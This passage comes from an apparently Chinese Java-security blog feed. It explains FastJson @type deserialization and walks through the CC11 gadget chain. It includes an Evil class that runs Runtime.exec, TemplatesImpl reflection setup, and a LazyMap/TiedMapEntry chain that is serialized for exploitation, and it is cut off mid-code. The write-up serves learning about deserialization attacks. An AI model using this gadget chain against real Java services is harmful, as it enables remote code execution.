name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再去掉参数<code>Feature.SupportNonPublicField</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240726003015680.png" alt="image-20240726003015680"></p><p>发现即便json中有数据, 也是不会还原到类中的, 因为age和name都是私有属性</p><p>但是当我们加上参数<code>Feature.SupportNonPublicField</code>, 即便没有setter, 也能够反序列化出非公有属性</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240726003218540.png" alt="image-20240726003218540"></p><h3 id="parse与parseObject区别"><a href="#parse与parseObject区别" class="headerlink" title="parse与parseObject区别"></a>parse与parseObject区别</h3><p>直接看图</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240726140808889.png" alt="image-20240726140808889"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240726140841710.png" alt="image-20240726140841710"></p><p>简单来说就是 <code>parseObject</code>，里面的参数需要加<code>Object.class</code>才能反序列化出对应类的对象, 否则反序列化出JSONObject类的对象</p><p>而<code>parse</code>直接反序列化出对应类的对象</p><h2 id="反序列化漏洞原理"><a href="#反序列化漏洞原理" class="headerlink" title="反序列化漏洞原理"></a>反序列化漏洞原理</h2><blockquote><p>fastjson 在反序列化的时候会去找我们在 <code>@type</code> 中规定的类是哪个类，然后在反序列化的时候会自动调用这些 setter 与 getter 方法的调用，注意！并不是所有的 setter 和 getter 方法。</p></blockquote><p>满足条件的setter：</p><ul><li>非静态函数</li><li>返回类型为void或当前类</li><li>参数个数为1个</li></ul><p>满足条件的getter：</p><ul><li>非静态方法</li><li>无参数</li><li><strong>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</strong></li></ul><p>那么是如何利用的呢??</p><p>实际上我们很容易就能联想到 在学习CommonsBeanUtils1这条链子时, 我们就已经初步尝试了利用JavaBean的getter方法来作为链子的一个节点, 这与FastJson的利用有着异曲同工之妙</p><p>FastJson在反序列化时, 也会调用getter, setter以及构造器, 当这些方法中存在危险操作时, 就可以进行利用</p><p>同时, 给parseObject的class参数的子类越多, 我们能反序列化出的类就越多</p><p>如<code>Object o = JSON.parseObject(poc,Object.class)</code>这样的语句中, 由于Object是所有类的父类, 因此可以反序列化出任意类</p><p>构造poc的方法也很简单, 这与php的反序列化相似</p><p>如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;@type&quot;:&quot;xxx.xxx.xxx&quot;,</span><br><span class="line">&quot;xxx&quot;:&quot;xxx&quot;,</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;FastJson&quot;&gt;&lt;a href=&quot;#FastJson&quot; class=&quot;headerlink&quot; title=&quot;FastJson&quot;&gt;&lt;/a&gt;FastJson&lt;/h1&gt;&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Shiro反序列化</title>
    <link href="http://example.com/2024/07/25/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2024/07/25/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-07-25T11:46:37.000Z</published>
    <updated>2024-07-25T12:20:35.815Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Shiro反序列化"><a href="#Shiro反序列化" class="headerlink" title="Shiro反序列化"></a>Shiro反序列化</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Shiro反序列化&quot;&gt;&lt;a href=&quot;#Shiro反序列化&quot; class=&quot;headerlink&quot; title=&quot;Shiro反序列化&quot;&gt;&lt;/a&gt;Shiro反序列化&lt;/h1&gt;</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>遗漏的CC11和CommonsBeanUtils链</title>
    <link href="http://example.com/2024/07/22/%E9%81%97%E6%BC%8F%E7%9A%84CC11%E5%92%8CCommonsBeanUtils%E9%93%BE/"/>
    <id>http://example.com/2024/07/22/%E9%81%97%E6%BC%8F%E7%9A%84CC11%E5%92%8CCommonsBeanUtils%E9%93%BE/</id>
    <published>2024-07-22T06:15:39.000Z</published>
    <updated>2024-07-25T09:29:17.580Z</updated>
    
    <content type="html"><![CDATA[<h1 id="遗漏的CC11和CommonsBeanUtils链"><a href="#遗漏的CC11和CommonsBeanUtils链" class="headerlink" title="遗漏的CC11和CommonsBeanUtils链"></a>遗漏的CC11和CommonsBeanUtils链</h1><p>之前我写了一篇专门分析cc链子的博客, 没有包含这位两条链子, 这里进行补充</p><h2 id="CC11"><a href="#CC11" class="headerlink" title="CC11"></a>CC11</h2><p>cc11对java版本没有限制, 我依然使用的是经典的jdk8u65</p><p>仍然是经典的cc依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>相信大家对这个版本已经是非常熟悉了, 这里就不多赘述了</p><p>cc11实际上是前面我们分析过的链子拼接来的, 它是利用的动态类加载</p><p>首先回忆一下, 在java核心库中, com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl这个类是可以进行任意类加载的, 我在cc3中首次分析了这个类的利用, 这里cc11也是利用了这个类并结合cc6的首部来触发</p><p>让我们再来分析一遍</p><p>首先找到com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl这个类, 他有一个defineClass方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722230820146.png" alt="image-20240722230820146"></p><p>这个方法返回一个类, 也就是一个动态类加载</p><p>我们找谁调用了这个方法</p><p>很容易找到在同一个类下有一次调用</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722230947998.png" alt="image-20240722230947998"></p><p>可这个defineTransletClasses依然是一个私有类型, 我们不能用cc6来调用这个方法, 所以继续寻找谁调用了defineTransletClasses方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722231426843.png" alt="image-20240722231426843"></p><p>我们可以找到getTransletInstance这个类, 不过它依然是私有</p><p>继续寻找</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722231657354.png" alt="image-20240722231657354"></p><p>这个newTransformer就是可以从外部访问的了</p><p>至此大概流程是这样的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722232705864.png" alt="image-20240722232705864"></p><p>这里需要注意的几个点就是一些必要的赋值, 之前在CC3中也分析过了, 这里再简单看一遍</p><p>newTransformer到getTransletInstance没有什么判断</p><p>看getTransletInstance到defineTransletClasses</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722231426843.png" alt="image-20240722231426843"></p><p>两个if判断, 要进入defineTransletClasses就需要_name不为null, _class为null</p><p>我们ctrl+鼠标左点到上面可以看见这两个属性的类型</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723124531024.png" alt="image-20240723124531024"></p><p>按照要求反射赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Field</span> <span class="variable">cls</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        cls.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        cls.set(templates, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>接下来是defineTransletClasses到defineClass这一步</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722230947998.png" alt="image-20240722230947998"></p><p>这里的_bytecodes就是我们要加载类的字节码</p><p>注意它的类型是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>首先我们先编译一个恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;CC11&quot;</span>);<span class="comment">//不会执行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用javac编译后获取它的字节码并赋值给_bytecodes</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\tmp\\Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br></pre></td></tr></table></figure><p>至此这里似乎就已经通了, 我们先直接调用newTransformer()试试</p><p>发现会报错</p><p>定位到最后错误的这一行</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723131418268.png" alt="image-20240723131418268"></p><p>打断点调试</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723131511941.png" alt="image-20240723131511941"></p><p>发现这里_tfactory是空, 导致报错出错误了</p><p>我们去看这个_tfactory的定义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> <span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>transient修饰使得_tfactory不被序列化进数据流, 所以即使现在我们反射给它赋值了, 序列化后它还是空值</p><p>我们不妨看看这个属性是否在其他地方进行了赋值</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723132345064.png" alt="image-20240723132345064"></p><p>我们在该类的<code>readObject</code>方法中发现了一次赋值, 也就是说, 实际上我们根本不需要对他赋值, 反序列化后会自动给_tfactory赋值</p><p>这里我们先反射赋一个相同的值测试这一段链子是否流通</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>());</span><br></pre></td></tr></table></figure><p>再次测试, 发现还是报错</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723133534887.png" alt="image-20240723133534887"></p><p>我们点击Creat breakpoint在抛出空指针错误的地方打断点</p><p>debug一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723133820653.png" alt="image-20240723133820653"></p><p>发现这个if里面会判断恶意类的父类必须是<code>ABSTRACT_TRANSLET</code>,  不然会去else里导致抛出错误, 我们点进去看看这个ABSTRACT_TRANSLET</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723134348495.png" alt="image-20240723134348495"></p><p>所以需要将恶意类继承com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</p><p>继承这个类需要实现对应的方法, 用idea自动帮我们实现就行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;CC11&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再次测试, 就可以弹出计算器啦!!!</p><p>至此后半链子就完成了</p><p>贴一下exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\tmp\\Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">cls</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        cls.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        cls.set(templates, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来就是要拼接上CC6的前半链子</p><p>我们先看一下CC6这条链子是什么样的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330121419699.png" alt="image-20240330121419699"></p><p>我们只需要执行调用newTransformer()这一个方法即可</p><p>所以大概流程就是这样</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723142611703.png" alt="image-20240723142611703"></p><p>不过实际上可以简化一部, 我们可以不使用HashSet.readObject() 作为入口, </p><p>在HashMap.readObject()的最后有这样一部调用</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723234352058.png" alt="image-20240723234352058"></p><p>这里可以直接调用到HashMap.hash(), 因此:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723234431270.png" alt="image-20240723234431270"></p><p>直接写出较短的那条</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\tmp\\Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">cls</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        cls.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        cls.set(templates, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Field tfactory = TemplatesImpl.class.getDeclaredField(&quot;_tfactory&quot;);</span></span><br><span class="line"><span class="comment">//        tfactory.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        tfactory.set(templates, new TransformerFactoryImpl());</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(innermap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;cabbage&quot;</span>);</span><br><span class="line">        innermap.remove(<span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazymap, chainedTransformer);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;cc11.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ObjectOutputStream 